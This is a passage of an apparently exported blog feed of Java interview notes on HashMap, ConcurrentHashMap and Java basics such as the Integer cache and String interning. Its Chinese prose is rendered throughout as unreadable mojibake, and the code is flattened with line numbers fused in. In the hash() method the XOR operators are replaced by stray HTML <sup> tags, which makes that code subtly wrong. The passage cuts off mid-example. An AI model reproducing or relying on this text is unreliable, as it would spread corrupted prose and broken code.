ä½¿ç”¨é“¾è¡¨çš„å¤´æ’æ³•ï¼Œä¹Ÿå°±æ˜¯æ–°çš„é”®å€¼å¯¹æ’åœ¨é“¾è¡¨çš„å¤´éƒ¨ï¼Œè€Œä¸æ˜¯é“¾è¡¨çš„å°¾éƒ¨ã€‚ 12345678910111213141516void addEntry(int hash, K key, V value, int bucketIndex) &#123; if ((size &gt;= threshold) &amp;&amp; (null != table[bucketIndex])) &#123; resize(2 * table.length); hash = (null != key) ? hash(key) : 0; bucketIndex = indexFor(hash, table.length); &#125; createEntry(hash, key, value, bucketIndex);&#125;void createEntry(int hash, K key, V value, int bucketIndex) &#123; Entry&lt;K,V&gt; e = table[bucketIndex]; // å¤´æ’æ³•ï¼Œé“¾è¡¨å¤´éƒ¨æŒ‡å‘æ–°çš„é”®å€¼å¯¹ table[bucketIndex] = new Entry&lt;&gt;(hash, key, value, e); size++;&#125; 123456Entry(int h, K k, V v, Entry&lt;K,V&gt; n) &#123; value = v; next = n; key = k; hash = h;&#125; 4. ç¡®å®šæ¡¶ä¸‹æ ‡å¾ˆå¤šæ“ä½œéƒ½éœ€è¦å…ˆç¡®å®šä¸€ä¸ªé”®å€¼å¯¹æ‰€åœ¨çš„æ¡¶ä¸‹æ ‡ã€‚ 12int hash = hash(key);int i = indexFor(hash, table.length); ï¼ˆä¸€ï¼‰è®¡ç®— hash å€¼ 1234567891011121314final int hash(Object k) &#123; int h = hashSeed; if (0 != h &amp;&amp; k instanceof String) &#123; return sun.misc.Hashing.stringHash32((String) k); &#125; h ^= k.hashCode(); // This function ensures that hashCodes that differ only by // constant multiples at each bit position have a bounded // number of collisions (approximately 8 at default load factor). h &lt;sup&gt;= (h &gt;&gt;&gt; 20) &lt;/sup&gt; (h &gt;&gt;&gt; 12); return h &lt;sup&gt; (h &gt;&gt;&gt; 7) &lt;/sup&gt; (h &gt;&gt;&gt; 4);&#125; 123public final int hashCode() &#123; return Objects.hashCode(key) ^ Objects.hashCode(value);&#125; ï¼ˆäºŒï¼‰å–æ¨¡ ä»¤ x = 1&lt;&lt;4ï¼Œå³ x ä¸º 2 çš„ 4 æ¬¡æ–¹ï¼Œå®ƒå…·æœ‰ä»¥ä¸‹æ€§è´¨ï¼š 12x : 00010000x-1 : 00001111 ä»¤ä¸€ä¸ªæ•° y ä¸ x-1 åšä¸è¿ç®—ï¼Œå¯ä»¥å»é™¤ y ä½çº§è¡¨ç¤ºçš„ç¬¬ 4 ä½ä»¥ä¸Šæ•°ï¼š 123y : 10110010x-1 : 00001111y&amp;(x-1) : 00000010 è¿™ä¸ªæ€§è´¨å’Œ y å¯¹ x å–æ¨¡æ•ˆæœæ˜¯ä¸€æ ·çš„ï¼š 123x : 00010000y : 10110010y%x : 00000010 æˆ‘ä»¬çŸ¥é“ï¼Œä½è¿ç®—çš„ä»£ä»·æ¯”æ±‚æ¨¡è¿ç®—å°çš„å¤šï¼Œå› æ­¤åœ¨è¿›è¡Œè¿™ç§è®¡ç®—æ—¶ç”¨ä½è¿ç®—çš„è¯èƒ½å¸¦æ¥æ›´é«˜çš„æ€§èƒ½ã€‚ ç¡®å®šæ¡¶ä¸‹æ ‡çš„æœ€åä¸€æ­¥æ˜¯å°† key çš„ hash å€¼å¯¹æ¡¶ä¸ªæ•°å–æ¨¡ï¼šhash%capacityï¼Œå¦‚æœèƒ½ä¿è¯ capacity ä¸º 2 çš„ n æ¬¡æ–¹ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°†è¿™ä¸ªæ“ä½œè½¬æ¢ä¸ºä½è¿ç®—ã€‚ 123static int indexFor(int h, int length) &#123; return h &amp; (length-1);&#125; 5. æ‰©å®¹-åŸºæœ¬åŸç†è®¾ HashMap çš„ table é•¿åº¦ä¸º Mï¼Œéœ€è¦å­˜å‚¨çš„é”®å€¼å¯¹æ•°é‡ä¸º Nï¼Œå¦‚æœå“ˆå¸Œå‡½æ•°æ»¡è¶³å‡åŒ€æ€§çš„è¦æ±‚ï¼Œé‚£ä¹ˆæ¯æ¡é“¾è¡¨çš„é•¿åº¦å¤§çº¦ä¸º N/Mï¼Œå› æ­¤å¹³å‡æŸ¥æ‰¾æ¬¡æ•°çš„å¤æ‚åº¦ä¸º O(N/M)ã€‚ ä¸ºäº†è®©æŸ¥æ‰¾çš„æˆæœ¬é™ä½ï¼Œåº”è¯¥å°½å¯èƒ½ä½¿å¾— N/M å°½å¯èƒ½å°ï¼Œå› æ­¤éœ€è¦ä¿è¯ M å°½å¯èƒ½å¤§ï¼Œä¹Ÿå°±æ˜¯è¯´ table è¦å°½å¯èƒ½å¤§ã€‚HashMap é‡‡ç”¨åŠ¨æ€æ‰©å®¹æ¥æ ¹æ®å½“å‰çš„ N å€¼æ¥è°ƒæ•´ M å€¼ï¼Œä½¿å¾—ç©ºé—´æ•ˆç‡å’Œæ—¶é—´æ•ˆç‡éƒ½èƒ½å¾—åˆ°ä¿è¯ã€‚ å’Œæ‰©å®¹ç›¸å…³çš„å‚æ•°ä¸»è¦æœ‰ï¼šcapacityã€sizeã€threshold å’Œ load_factorã€‚ å‚æ•° å«ä¹‰ capacity table çš„å®¹é‡å¤§å°ï¼Œé»˜è®¤ä¸º 16ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ capacity å¿…é¡»ä¿è¯ä¸º 2 çš„ n æ¬¡æ–¹ã€‚ size table çš„å®é™…ä½¿ç”¨é‡ã€‚ threshold size çš„ä¸´ç•Œå€¼ï¼Œsize å¿…é¡»å°äº thresholdï¼Œå¦‚æœå¤§äºç­‰äºï¼Œå°±å¿…é¡»è¿›è¡Œæ‰©å®¹æ“ä½œã€‚ load_factor è£…è½½å› å­ï¼Œtable èƒ½å¤Ÿä½¿ç”¨çš„æ¯”ä¾‹ï¼Œthreshold = capacity * load_factorã€‚ 123456789101112131415static final int DEFAULT_INITIAL_CAPACITY = 16;static final int MAXIMUM_CAPACITY = 1 &lt;&lt; 30;static final float DEFAULT_LOAD_FACTOR = 0.75f;transient Entry[] table;transient int size;int threshold;final float loadFactor;transient int modCount; ä»ä¸‹é¢çš„æ·»åŠ å…ƒç´ ä»£ç ä¸­å¯ä»¥çœ‹å‡ºï¼Œå½“éœ€è¦æ‰©å®¹æ—¶ï¼Œä»¤ capacity ä¸ºåŸæ¥çš„ä¸¤å€ã€‚ 123456void addEntry(int hash, K key, V value, int bucketIndex) &#123; Entry&lt;K,V&gt; e = table[bucketIndex]; table[bucketIndex] = new Entry&lt;&gt;(hash, key, value, e); if (size++ &gt;= threshold) resize(2 * table.length);&#125; æ‰©å®¹ä½¿ç”¨ resize() å®ç°ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ‰©å®¹æ“ä½œåŒæ ·éœ€è¦æŠŠæ—§ table çš„æ‰€æœ‰é”®å€¼å¯¹é‡æ–°æ’å…¥æ–°çš„ table ä¸­ï¼Œå› æ­¤è¿™ä¸€æ­¥æ˜¯å¾ˆè´¹æ—¶çš„ã€‚ 123456789101112131415161718192021222324252627282930void resize(int newCapacity) &#123; Entry[] oldTable = table; int oldCapacity = oldTable.length; if (oldCapacity == MAXIMUM_CAPACITY) &#123; threshold = Integer.MAX_VALUE; return; &#125; Entry[] newTable = new Entry[newCapacity]; transfer(newTable); table = newTable; threshold = (int)(newCapacity * loadFactor);&#125;void transfer(Entry[] newTable) &#123; Entry[] src = table; int newCapacity = newTable.length; for (int j = 0; j &lt; src.length; j++) &#123; Entry&lt;K,V&gt; e = src[j]; if (e != null) &#123; src[j] = null; do &#123; Entry&lt;K,V&gt; next = e.next; int i = indexFor(e.hash, newCapacity); e.next = newTable[i]; newTable[i] = e; e = next; &#125; while (e != null); &#125; &#125;&#125; 6. æ‰©å®¹-é‡æ–°è®¡ç®—æ¡¶ä¸‹æ ‡åœ¨è¿›è¡Œæ‰©å®¹æ—¶ï¼Œéœ€è¦æŠŠé”®å€¼å¯¹é‡æ–°æ”¾åˆ°å¯¹åº”çš„æ¡¶ä¸Šã€‚HashMap ä½¿ç”¨äº†ä¸€ä¸ªç‰¹æ®Šçš„æœºåˆ¶ï¼Œå¯ä»¥é™ä½é‡æ–°è®¡ç®—æ¡¶ä¸‹æ ‡çš„æ“ä½œã€‚ å‡è®¾åŸæ•°ç»„é•¿åº¦ capacity ä¸º 8ï¼Œæ‰©å®¹ä¹‹å new capacity ä¸º 16ï¼š 12capacity : 00010000new capacity : 00100000 å¯¹äºä¸€ä¸ª Keyï¼Œå®ƒçš„å“ˆå¸Œå€¼å¦‚æœåœ¨ç¬¬ 6 ä½ä¸Šä¸º 0ï¼Œé‚£ä¹ˆå–æ¨¡å¾—åˆ°çš„ç»“æœå’Œä¹‹å‰ä¸€æ ·ï¼›å¦‚æœä¸º 1ï¼Œé‚£ä¹ˆå¾—åˆ°çš„ç»“æœä¸ºåŸæ¥çš„ç»“æœ + 8ã€‚ 7. æ‰©å®¹-è®¡ç®—æ•°ç»„å®¹é‡HashMap æ„é€ å‡½æ•°å…è®¸ç”¨æˆ·ä¼ å…¥çš„å®¹é‡ä¸æ˜¯ 2 çš„ n æ¬¡æ–¹ï¼Œå› ä¸ºå®ƒå¯ä»¥è‡ªåŠ¨åœ°å°†ä¼ å…¥çš„å®¹é‡è½¬æ¢ä¸º 2 çš„ n æ¬¡æ–¹ã€‚ å…ˆè€ƒè™‘å¦‚ä½•æ±‚ä¸€ä¸ªæ•°çš„æ©ç ï¼Œå¯¹äº 10010000ï¼Œå®ƒçš„æ©ç ä¸º 11111111ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•å¾—åˆ°ï¼š 123mask |= mask &gt;&gt; 1 11011000mask |= mask &gt;&gt; 2 11111100mask |= mask &gt;&gt; 4 11111111 mask+1 æ˜¯å¤§äºåŸå§‹æ•°å­—çš„æœ€å°çš„ 2 çš„ n æ¬¡æ–¹ã€‚ 12num 10010000mask+1 100000000 ä»¥ä¸‹æ˜¯ HashMap ä¸­è®¡ç®—æ•°ç»„å®¹é‡çš„ä»£ç ï¼š 123456789static final int tableSizeFor(int cap) &#123; int n = cap - 1; n |= n &gt;&gt;&gt; 1; n |= n &gt;&gt;&gt; 2; n |= n &gt;&gt;&gt; 4; n |= n &gt;&gt;&gt; 8; n |= n &gt;&gt;&gt; 16; return (n &lt; 0) ? 1 : (n &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : n + 1;&#125; 8. é“¾è¡¨è½¬çº¢é»‘æ ‘ä» JDK 1.8 å¼€å§‹ï¼Œä¸€ä¸ªæ¡¶å­˜å‚¨çš„é“¾è¡¨é•¿åº¦å¤§äº 8 æ—¶ä¼šå°†é“¾è¡¨è½¬æ¢ä¸ºçº¢é»‘æ ‘ã€‚ 9. HashMap ä¸ HashTable HashTable ä½¿ç”¨ synchronized æ¥è¿›è¡ŒåŒæ­¥ã€‚ HashMap å¯ä»¥æ’å…¥é”®ä¸º null çš„ Entryã€‚ HashMap çš„è¿­ä»£å™¨æ˜¯ fail-fast è¿­ä»£å™¨ã€‚ HashMap ä¸èƒ½ä¿è¯éšç€æ—¶é—´çš„æ¨ç§» Map ä¸­çš„å…ƒç´ æ¬¡åºæ˜¯ä¸å˜çš„ã€‚ ConcurrentHashMap1. å­˜å‚¨ç»“æ„123456static final class HashEntry&lt;K,V&gt; &#123; final int hash; final K key; volatile V value; volatile HashEntry&lt;K,V&gt; next;&#125; ConcurrentHashMap å’Œ HashMap å®ç°ä¸Šç±»ä¼¼ï¼Œæœ€ä¸»è¦çš„å·®åˆ«æ˜¯ ConcurrentHashMap é‡‡ç”¨äº†åˆ†æ®µé”ï¼ˆSegmentï¼‰ï¼Œæ¯ä¸ªåˆ†æ®µé”ç»´æŠ¤ç€å‡ ä¸ªæ¡¶ï¼ˆHashEntryï¼‰ï¼Œå¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶è®¿é—®ä¸åŒåˆ†æ®µé”ä¸Šçš„æ¡¶ï¼Œä»è€Œä½¿å…¶å¹¶å‘åº¦æ›´é«˜ï¼ˆå¹¶å‘åº¦å°±æ˜¯ Segment çš„ä¸ªæ•°ï¼‰ã€‚ Segment ç»§æ‰¿è‡ª ReentrantLockã€‚ 1234567891011121314151617static final class Segment&lt;K,V&gt; extends ReentrantLock implements Serializable &#123; private static final long serialVersionUID = 2249069246763182397L; static final int MAX_SCAN_RETRIES = Runtime.getRuntime().availableProcessors() &gt; 1 ? 64 : 1; transient volatile HashEntry&lt;K,V&gt;[] table; transient int count; transient int modCount; transient int threshold; final float loadFactor;&#125; 1final Segment&lt;K,V&gt;[] segments; é»˜è®¤çš„å¹¶å‘çº§åˆ«ä¸º 16ï¼Œä¹Ÿå°±æ˜¯è¯´é»˜è®¤åˆ›å»º 16 ä¸ª Segmentã€‚ 1static final int DEFAULT_CONCURRENCY_LEVEL = 16; 2. size æ“ä½œæ¯ä¸ª Segment ç»´æŠ¤äº†ä¸€ä¸ª count å˜é‡æ¥ç»Ÿè®¡è¯¥ Segment ä¸­çš„é”®å€¼å¯¹ä¸ªæ•°ã€‚ 12345/** * The number of elements. Accessed only either within locks * or among other volatile reads that maintain visibility. */transient int count; åœ¨æ‰§è¡Œ size æ“ä½œæ—¶ï¼Œéœ€è¦éå†æ‰€æœ‰ Segment ç„¶åæŠŠ count ç´¯è®¡èµ·æ¥ã€‚ ConcurrentHashMap åœ¨æ‰§è¡Œ size æ“ä½œæ—¶å…ˆå°è¯•ä¸åŠ é”ï¼Œå¦‚æœè¿ç»­ä¸¤æ¬¡ä¸åŠ é”æ“ä½œå¾—åˆ°çš„ç»“æœä¸€è‡´ï¼Œé‚£ä¹ˆå¯ä»¥è®¤ä¸ºè¿™ä¸ªç»“æœæ˜¯æ­£ç¡®çš„ã€‚ å°è¯•æ¬¡æ•°ä½¿ç”¨ RETRIES_BEFORE_LOCK å®šä¹‰ï¼Œè¯¥å€¼ä¸º 2ï¼Œretries åˆå§‹å€¼ä¸º -1ï¼Œå› æ­¤å°è¯•æ¬¡æ•°ä¸º 3ã€‚ å¦‚æœå°è¯•çš„æ¬¡æ•°è¶…è¿‡ 3 æ¬¡ï¼Œå°±éœ€è¦å¯¹æ¯ä¸ª Segment åŠ é”ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950/** * Number of unsynchronized retries in size and containsValue * methods before resorting to locking. This is used to avoid * unbounded retries if tables undergo continuous modification * which would make it impossible to obtain an accurate result. */static final int RETRIES_BEFORE_LOCK = 2;public int size() &#123; // Try a few times to get accurate count. On failure due to // continuous async changes in table, resort to locking. final Segment&lt;K,V&gt;[] segments = this.segments; int size; boolean overflow; // true if size overflows 32 bits long sum; // sum of modCounts long last = 0L; // previous sum int retries = -1; // first iteration isn't retry try &#123; for (;;) &#123; // è¶…è¿‡å°è¯•æ¬¡æ•°ï¼Œåˆ™å¯¹æ¯ä¸ª Segment åŠ é” if (retries++ == RETRIES_BEFORE_LOCK) &#123; for (int j = 0; j &lt; segments.length; ++j) ensureSegment(j).lock(); // force creation &#125; sum = 0L; size = 0; overflow = false; for (int j = 0; j &lt; segments.length; ++j) &#123; Segment&lt;K,V&gt; seg = segmentAt(segments, j); if (seg != null) &#123; sum += seg.modCount; int c = seg.count; if (c &lt; 0 || (size += c) &lt; 0) overflow = true; &#125; &#125; // è¿ç»­ä¸¤æ¬¡å¾—åˆ°çš„ç»“æœä¸€è‡´ï¼Œåˆ™è®¤ä¸ºè¿™ä¸ªç»“æœæ˜¯æ­£ç¡®çš„ if (sum == last) break; last = sum; &#125; &#125; finally &#123; if (retries &gt; RETRIES_BEFORE_LOCK) &#123; for (int j = 0; j &lt; segments.length; ++j) segmentAt(segments, j).unlock(); &#125; &#125; return overflow ? Integer.MAX_VALUE : size;&#125; 3. JDK 1.8 çš„æ”¹åŠ¨JDK 1.7 ä½¿ç”¨åˆ†æ®µé”æœºåˆ¶æ¥å®ç°å¹¶å‘æ›´æ–°æ“ä½œï¼Œæ ¸å¿ƒç±»ä¸º Segmentï¼Œå®ƒç»§æ‰¿è‡ªé‡å…¥é” ReentrantLockï¼Œå¹¶å‘ç¨‹åº¦ä¸ Segment æ•°é‡ç›¸ç­‰ã€‚ JDK 1.8 ä½¿ç”¨äº† CAS æ“ä½œæ¥æ”¯æŒæ›´é«˜çš„å¹¶å‘åº¦ï¼Œåœ¨ CAS æ“ä½œå¤±è´¥æ—¶ä½¿ç”¨å†…ç½®é” synchronizedã€‚ å¹¶ä¸” JDK 1.8 çš„å®ç°ä¹Ÿåœ¨é“¾è¡¨è¿‡é•¿æ—¶ä¼šè½¬æ¢ä¸ºçº¢é»‘æ ‘ã€‚ å‚è€ƒèµ„æ–™ Eckel B. Java ç¼–ç¨‹æ€æƒ³ [M]. æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾, 2002. Java Collection Framework Iterator æ¨¡å¼ Java 8 ç³»åˆ—ä¹‹é‡æ–°è®¤è¯† HashMap What is difference between HashMap and Hashtable in Java? Java é›†åˆä¹‹ HashMap The principle of ConcurrentHashMap analysis æ¢ç´¢ ConcurrentHashMap é«˜å¹¶å‘æ€§çš„å®ç°æœºåˆ¶ HashMap ç›¸å…³é¢è¯•é¢˜åŠå…¶è§£ç­” Java é›†åˆç»†èŠ‚ï¼ˆäºŒï¼‰ï¼šasList çš„ç¼ºé™· Java Collection Framework â€“ The LinkedList Class]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java åŸºç¡€]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2FJava%20%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[ä¸€ã€åŸºæœ¬ç±»å‹ åŒ…è£…ç±»å‹ ç¼“å­˜æ±  äºŒã€String æ¦‚è§ˆ String ä¸å¯å˜çš„å¥½å¤„ String, StringBuffer and StringBuilder String.intern() ä¸‰ã€è¿ç®— å‚æ•°ä¼ é€’ float ä¸ double éšå¼ç±»å‹è½¬æ¢ switch å››ã€ç»§æ‰¿ è®¿é—®æƒé™ æŠ½è±¡ç±»ä¸æ¥å£ super é‡å†™ä¸é‡è½½ äº”ã€Object é€šç”¨æ–¹æ³• æ¦‚è§ˆ equals() hashCode() toString() clone() å…­ã€å…³é”®å­— final static ä¸ƒã€åå°„ å…«ã€å¼‚å¸¸ ä¹ã€æ³›å‹ åã€æ³¨è§£ åä¸€ã€ç‰¹æ€§ Java å„ç‰ˆæœ¬çš„æ–°ç‰¹æ€§ Java ä¸ C++ çš„åŒºåˆ« JRE or JDK å‚è€ƒèµ„æ–™ ä¸€ã€åŸºæœ¬ç±»å‹åŒ…è£…ç±»å‹å…«ä¸ªåŸºæœ¬ç±»å‹ï¼š boolean/1 byte/8 char/16 short/16 int/32 float/32 long/64 double/64 åŸºæœ¬ç±»å‹éƒ½æœ‰å¯¹åº”çš„åŒ…è£…ç±»å‹ï¼ŒåŸºæœ¬ç±»å‹ä¸å…¶å¯¹åº”çš„åŒ…è£…ç±»å‹ä¹‹é—´çš„èµ‹å€¼ä½¿ç”¨è‡ªåŠ¨è£…ç®±ä¸æ‹†ç®±å®Œæˆã€‚ 12Integer x = 2; // è£…ç®±int y = x; // æ‹†ç®± ç¼“å­˜æ± new Integer(123) ä¸ Integer.valueOf(123) çš„åŒºåˆ«åœ¨äºï¼Œnew Integer(123) æ¯æ¬¡éƒ½ä¼šæ–°å»ºä¸€ä¸ªå¯¹è±¡ï¼Œè€Œ Integer.valueOf(123) å¯èƒ½ä¼šä½¿ç”¨ç¼“å­˜å¯¹è±¡ï¼Œå› æ­¤å¤šæ¬¡ä½¿ç”¨ Integer.valueOf(123) ä¼šå–å¾—åŒä¸€ä¸ªå¯¹è±¡çš„å¼•ç”¨ã€‚ 123456Integer x = new Integer(123);Integer y = new Integer(123);System.out.println(x == y); // falseInteger z = Integer.valueOf(123);Integer k = Integer.valueOf(123);System.out.println(z == k); // true ç¼–è¯‘å™¨ä¼šåœ¨è‡ªåŠ¨è£…ç®±è¿‡ç¨‹è°ƒç”¨ valueOf() æ–¹æ³•ï¼Œå› æ­¤å¤šä¸ª Integer å®ä¾‹ä½¿ç”¨è‡ªåŠ¨è£…ç®±æ¥åˆ›å»ºå¹¶ä¸”å€¼ç›¸åŒï¼Œé‚£ä¹ˆå°±ä¼šå¼•ç”¨ç›¸åŒçš„å¯¹è±¡ã€‚ 123Integer m = 123;Integer n = 123;System.out.println(m == n); // true valueOf() æ–¹æ³•çš„å®ç°æ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯å…ˆåˆ¤æ–­å€¼æ˜¯å¦åœ¨ç¼“å­˜æ± ä¸­ï¼Œå¦‚æœåœ¨çš„è¯å°±ç›´æ¥ä½¿ç”¨ç¼“å­˜æ± çš„å†…å®¹ã€‚ 12345public static Integer valueOf(int i) &#123; if (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high) return IntegerCache.cache[i + (-IntegerCache.low)]; return new Integer(i);&#125; åœ¨ Java 8 ä¸­ï¼ŒInteger ç¼“å­˜æ± çš„å¤§å°é»˜è®¤ä¸º -128~127ã€‚ 1234567891011121314151617181920212223242526272829static final int low = -128;static final int high;static final Integer cache[];static &#123; // high value may be configured by property int h = 127; String integerCacheHighPropValue = sun.misc.VM.getSavedProperty("java.lang.Integer.IntegerCache.high"); if (integerCacheHighPropValue != null) &#123; try &#123; int i = parseInt(integerCacheHighPropValue); i = Math.max(i, 127); // Maximum array size is Integer.MAX_VALUE h = Math.min(i, Integer.MAX_VALUE - (-low) -1); &#125; catch( NumberFormatException nfe) &#123; // If the property cannot be parsed into an int, ignore it. &#125; &#125; high = h; cache = new Integer[(high - low) + 1]; int j = low; for(int k = 0; k &lt; cache.length; k++) cache[k] = new Integer(j++); // range [-128, 127] must be interned (JLS7 5.1.7) assert IntegerCache.high &gt;= 127;&#125; Java è¿˜å°†ä¸€äº›å…¶å®ƒåŸºæœ¬ç±»å‹çš„å€¼æ”¾åœ¨ç¼“å†²æ± ä¸­ï¼ŒåŒ…å«ä»¥ä¸‹è¿™äº›ï¼š boolean values true and false all byte values short values between -128 and 127 int values between -128 and 127 char in the range \u0000 to \u007F å› æ­¤åœ¨ä½¿ç”¨è¿™äº›åŸºæœ¬ç±»å‹å¯¹åº”çš„åŒ…è£…ç±»å‹æ—¶ï¼Œå°±å¯ä»¥ç›´æ¥ä½¿ç”¨ç¼“å†²æ± ä¸­çš„å¯¹è±¡ã€‚ StackOverflow : Differences between new Integer(123), Integer.valueOf(123) and just 123 äºŒã€Stringæ¦‚è§ˆString è¢«å£°æ˜ä¸º finalï¼Œå› æ­¤å®ƒä¸å¯è¢«ç»§æ‰¿ã€‚ å†…éƒ¨ä½¿ç”¨ char æ•°ç»„å­˜å‚¨æ•°æ®ï¼Œè¯¥æ•°ç»„è¢«å£°æ˜ä¸º finalï¼Œè¿™æ„å‘³ç€ value æ•°ç»„åˆå§‹åŒ–ä¹‹åå°±ä¸èƒ½å†å¼•ç”¨å…¶å®ƒæ•°ç»„ã€‚å¹¶ä¸” String å†…éƒ¨æ²¡æœ‰æ”¹å˜ value æ•°ç»„çš„æ–¹æ³•ï¼Œå› æ­¤å¯ä»¥ä¿è¯ String ä¸å¯å˜ã€‚ 1234public final class String implements java.io.Serializable, Comparable&lt;String&gt;, CharSequence &#123; /** The value is used for character storage. */ private final char value[]; String ä¸å¯å˜çš„å¥½å¤„1. å¯ä»¥ç¼“å­˜ hash å€¼ å› ä¸º String çš„ hash å€¼ç»å¸¸è¢«ä½¿ç”¨ï¼Œä¾‹å¦‚ String ç”¨åš HashMap çš„ keyã€‚ä¸å¯å˜çš„ç‰¹æ€§å¯ä»¥ä½¿å¾— hash å€¼ä¹Ÿä¸å¯å˜ï¼Œå› æ­¤åªéœ€è¦è¿›è¡Œä¸€æ¬¡è®¡ç®—ã€‚ 2. String Pool çš„éœ€è¦ å¦‚æœä¸€ä¸ª String å¯¹è±¡å·²ç»è¢«åˆ›å»ºè¿‡äº†ï¼Œé‚£ä¹ˆå°±ä¼šä» String Pool ä¸­å–å¾—å¼•ç”¨ã€‚åªæœ‰ String æ˜¯ä¸å¯å˜çš„ï¼Œæ‰å¯èƒ½ä½¿ç”¨ String Poolã€‚ 3. å®‰å…¨æ€§ String ç»å¸¸ä½œä¸ºå‚æ•°ï¼ŒString ä¸å¯å˜æ€§å¯ä»¥ä¿è¯å‚æ•°ä¸å¯å˜ã€‚ä¾‹å¦‚åœ¨ä½œä¸ºç½‘ç»œè¿æ¥å‚æ•°çš„æƒ…å†µä¸‹å¦‚æœ String æ˜¯å¯å˜çš„ï¼Œé‚£ä¹ˆåœ¨ç½‘ç»œè¿æ¥è¿‡ç¨‹ä¸­ï¼ŒString è¢«æ”¹å˜ï¼Œæ”¹å˜ String å¯¹è±¡çš„é‚£ä¸€æ–¹ä»¥ä¸ºç°åœ¨è¿æ¥çš„æ˜¯å…¶å®ƒä¸»æœºï¼Œè€Œå®é™…æƒ…å†µå´ä¸ä¸€å®šæ˜¯ã€‚ 4. çº¿ç¨‹å®‰å…¨ String ä¸å¯å˜æ€§å¤©ç”Ÿå…·å¤‡çº¿ç¨‹å®‰å…¨ï¼Œå¯ä»¥åœ¨å¤šä¸ªçº¿ç¨‹ä¸­å®‰å…¨åœ°ä½¿ç”¨ã€‚ Program Creek : Why String is immutable in Java? String, StringBuffer and StringBuilder1. å¯å˜æ€§ String ä¸å¯å˜ StringBuffer å’Œ StringBuilder å¯å˜ 2. çº¿ç¨‹å®‰å…¨ String ä¸å¯å˜ï¼Œå› æ­¤æ˜¯çº¿ç¨‹å®‰å…¨çš„ StringBuilder ä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ StringBuffer æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œå†…éƒ¨ä½¿ç”¨ synchronized æ¥åŒæ­¥ StackOverflow : String, StringBuffer, and StringBuilder String.intern()ä½¿ç”¨ String.intern() å¯ä»¥ä¿è¯ç›¸åŒå†…å®¹çš„å­—ç¬¦ä¸²å˜é‡å¼•ç”¨ç›¸åŒçš„å†…å­˜å¯¹è±¡ã€‚ ä¸‹é¢ç¤ºä¾‹ä¸­ï¼Œs1 å’Œ s2 é‡‡ç”¨ new String() çš„æ–¹å¼æ–°å»ºäº†ä¸¤ä¸ªä¸åŒå¯¹è±¡ï¼Œè€Œ s3 æ˜¯é€šè¿‡ s1.intern() æ–¹æ³•å–å¾—ä¸€ä¸ªå¯¹è±¡å¼•ç”¨ï¼Œè¿™ä¸ªæ–¹æ³•é¦–å…ˆæŠŠ s1 å¼•ç”¨çš„å¯¹è±¡æ”¾åˆ° String Pollï¼ˆå­—ç¬¦ä¸²å¸¸é‡æ± ï¼‰ä¸­ï¼Œç„¶åè¿”å›è¿™ä¸ªå¯¹è±¡å¼•ç”¨ã€‚å› æ­¤ s3 å’Œ s1 å¼•ç”¨çš„æ˜¯åŒä¸€ä¸ªå­—ç¬¦ä¸²å¸¸é‡æ± çš„å¯¹è±¡ã€‚ 12345String s1 = new String("aaa");String s2 = new String("aaa");System.out.println(s1 == s2); // falseString s3 = s1.intern();System.out.println(s1.intern() == s3); // true å¦‚æœæ˜¯é‡‡ç”¨ â€œbbbâ€ è¿™ç§ä½¿ç”¨åŒå¼•å·çš„å½¢å¼åˆ›å»ºå­—ç¬¦ä¸²å®ä¾‹ï¼Œä¼šè‡ªåŠ¨åœ°å°†æ–°å»ºçš„å¯¹è±¡æ”¾å…¥ String Poll ä¸­ã€‚ 123String s4 = "bbb";String s5 = "bbb";System.out.println(s4 == s5); // true åœ¨ Java 7 ä¹‹å‰ï¼Œå­—ç¬¦ä¸²å¸¸é‡æ± è¢«æ”¾åœ¨è¿è¡Œæ—¶å¸¸é‡æ± ä¸­ï¼Œå®ƒå±äºæ°¸ä¹…ä»£ã€‚è€Œåœ¨ Java 7ï¼Œå­—ç¬¦ä¸²å¸¸é‡æ± è¢«æ”¾åœ¨å †ä¸­ã€‚è¿™æ˜¯å› ä¸ºæ°¸ä¹…ä»£çš„ç©ºé—´æœ‰é™ï¼Œåœ¨å¤§é‡ä½¿ç”¨å­—ç¬¦ä¸²çš„åœºæ™¯ä¸‹ä¼šå¯¼è‡´ OutOfMemoryError é”™è¯¯ã€‚ StackOverflow : What is String interning? æ·±å…¥è§£æ String#intern ä¸‰ã€è¿ç®—å‚æ•°ä¼ é€’Java çš„å‚æ•°æ˜¯ä»¥å€¼ä¼ é€’çš„å½¢å¼ä¼ å…¥æ–¹æ³•ä¸­ï¼Œè€Œä¸æ˜¯å¼•ç”¨ä¼ é€’ã€‚ Dog dog çš„ dog æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œå­˜å‚¨çš„æ˜¯å¯¹è±¡çš„åœ°å€ã€‚åœ¨å°†ä¸€ä¸ªå‚æ•°ä¼ å…¥ä¸€ä¸ªæ–¹æ³•æ—¶ï¼Œæœ¬è´¨ä¸Šæ˜¯å°†å¯¹è±¡çš„åœ°å€ä»¥å€¼çš„æ–¹å¼ä¼ é€’åˆ°å½¢å‚ä¸­ã€‚ 123456789101112131415public class Dog &#123; String name; Dog(String name) &#123; this.name = name; &#125; String getName() &#123; return name; &#125; String getObjectAddress() &#123; return super.toString(); &#125;&#125; 12345678910111213141516public class PassByValueExample &#123; public static void main(String[] args) &#123; Dog dog = new Dog("A"); System.out.println(dog.getObjectAddress()); // Dog@4554617c func(dog); System.out.println(dog.getObjectAddress()); // Dog@4554617c System.out.println(dog.getName()); // A &#125; private static void func(Dog dog) &#123; 